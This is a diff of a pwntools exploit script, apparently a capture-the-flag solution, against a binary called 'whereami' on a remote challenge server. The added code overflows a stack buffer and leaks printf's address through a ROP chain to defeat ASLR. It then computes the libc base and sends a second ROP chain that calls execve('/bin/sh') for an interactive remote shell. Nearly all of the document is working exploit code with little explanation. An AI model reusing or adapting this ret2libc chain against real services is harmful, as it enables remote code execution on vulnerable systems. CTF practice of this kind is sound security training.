@@ -1,55 +1,74 @@
 from pwn import *
+from pwnlib.util.packing import p64, u64, unpack
 
 context.arch='amd64'
-elf = ELF('whereami')
+elf = ELF('whereami', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
 
-print(f"{hex(elf.plt.exit)=}")
-print(f"{hex(elf.got.exit)=}")
+rop = ROP(elf)
 
-libc = ELF('libc.so.6')
-diff = elf.symbols['exit'] - libc.symbols['exit']
-libc.address=diff
+poprdi = 0x00401303
+pop_rsi_r15 = 0x00401301
+ret = 0x0040101a
 
-print(f"{hex(libc.symbols.exit)=}")
+sm = libc.symbols[b'system']
 
-rop = ROP(libc)
-sh = 0x00000000001b45bd #next(libc.search(b'/bin/sh'))
-print(f"{hex(sh)=}")
-poprdi = 0x0000000000401303
-poprsi = 0x0000000000401301
-mov_ptr_rdi_rsi = 0x0000000000057b8a
-pushrdi = 0x00000000000e312b
-sm = libc.symbols[b'system']# next(libc.search(b'/bin/sh'))
-# 0x00000000001507f9 # pop rax; call rax
 rop.raw('a'*0x40)
 rop.raw(unpack(b'AAAAAAAA'))
 rop.raw(p64(poprdi))
-rop.raw(p64(elf.plt.exit))
-rop.raw(p64(poprsi))
-rop.raw(p64(libc.symbols.system))
-rop.raw(p64(libc.symbols.system))
-rop.raw(p64(mov_ptr_rdi_rsi))
+rop.raw(p64(elf.got.printf))
+rop.raw(p64(elf.symbols.puts))
+
 rop.raw(p64(poprdi))
-rop.raw(p64(elf.plt.exit))
-rop.raw(p64(0x00000000041235))
-#rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
-#$poprdi_addr = rop.find_gadget('rdi')
-#$sh_addr = rop.
-#$system_addr = libc.symbols.system
-#$craft = [
-    #$b"A"*0x40,
-    #$b"KKKKLLLL",
-    #$p64(poprdi_addr),
-    #$p64(sh_addr),
-    #$p64(system_addr)
-#$]
-#$payload = b"".join(craft)
-with open('in2.txt','wb') as f:
-    f.write(bytes(rop))
+rop.raw(p64(elf.symbols.counter))
+rop.raw(p64(elf.symbols.gets))
 
-#p = remote('challs.actf.co', 31222)
-#p = process('whereami')
+rop.raw(p64(ret))
+rop.raw(p64(elf.symbols.main))
 
-#p.recvuntil(b'?')
-#p.sendline(payload)
-#p.interactive()
+payload = bytes(rop)
+
+p = remote('challs.actf.co', 31222)
+#p = process(elf)
+
+print(p.recvuntil(b'?').decode())
+p.sendline(payload)
+p.sendline(b'\x00')
+print(p.recvuntil(b'too.\n').decode())
+data = p.recvn(6).ljust(8, b'\x00')
+
+printfAddr = u64(data)
+
+log.success("Leaked printf address: 0x%x", printfAddr)
+baseAddr = printfAddr - libc.symbols.printf
+libc.address = baseAddr
+
+pop_rdx_r12 = baseAddr + 0x0000000000119241
+
+rop2 = ROP([elf, libc])
+sh = next(libc.search(b"/bin/sh\x00"))
+rop2.raw(0x40*'a')
+rop2.raw(unpack(b'AAAABBBB'))
+
+# the hard way
+rop2.raw(p64(pop_rdx_r12))
+rop2.raw(p64(0x00))
+rop2.raw(p64(0x00))
+rop2.raw(p64(pop_rsi_r15))
+rop2.raw(p64(0x00))
+rop2.raw(p64(0x00))
+rop2.raw(p64(poprdi))
+rop2.raw(p64(sh))
+rop2.raw(p64(libc.symbols.execve))
+
+# shorter way:
+# rop2.execve(sh, 0, 0)
+
+#print(bytes(rop2))
+#print("")
+#print(hex(libc.symbols.execve - baseAddr))
+
+print(p.recvuntil(b"?").decode())
+p.sendline(bytes(rop2))
+
+p.interactive()
